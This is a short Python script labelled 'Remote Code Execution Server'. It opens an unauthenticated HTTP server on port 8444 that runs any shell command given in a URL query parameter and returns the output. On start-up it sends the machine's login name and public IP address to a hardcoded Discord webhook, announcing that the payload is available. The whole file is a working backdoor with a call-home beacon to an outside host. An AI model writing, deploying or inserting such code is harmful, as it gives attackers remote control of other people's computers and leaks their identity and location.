# Remote Code Execution Server
# Host on :8444

from http.server import BaseHTTPRequestHandler, HTTPServer
import socket, subprocess, requests, os, urllib
from urllib.parse import urlparse, parse_qs

payld = "1"

def ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
            return response.read().decode().strip()
    except:return None

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    localIP = s.getsockname()[0]
    s.close()
except Exception:
    localIP = "127.0.0.1"

class SERVER(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Parse query parameters
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)
            command = params.get('command', [''])[0]
            
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            
            if command:
                result = subprocess.check_output(
                    command, shell=True, text=True, stderr=subprocess.STDOUT
                )
                self.wfile.write(result.encode("utf-8"))
            else:
                self.wfile.write(b"No command received")
        except Exception as e:
            self.wfile.write(f"Error: {e}".encode())

webServer = HTTPServer((localIP, 8444), SERVER)
webServer.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

print(f"[*] RCE Server running on {localIP}:8444")

data = {
    'content': "Availible. Using payload v"+payld,
    'username': os.getlogin() + " " + ip()
}

requests.post("https://discord.com/api/webhooks/1487135128831529132/R17GuWFfdn_307OA6Nw-KRmpioOXH9HPchuX6nm-N0jSd3E1F1fv6_gWQd49jWalZ4C3", json=data)

try:
    webServer.serve_forever()
except KeyboardInterrupt:
    pass
finally:
    # webServer.server_close()
    pass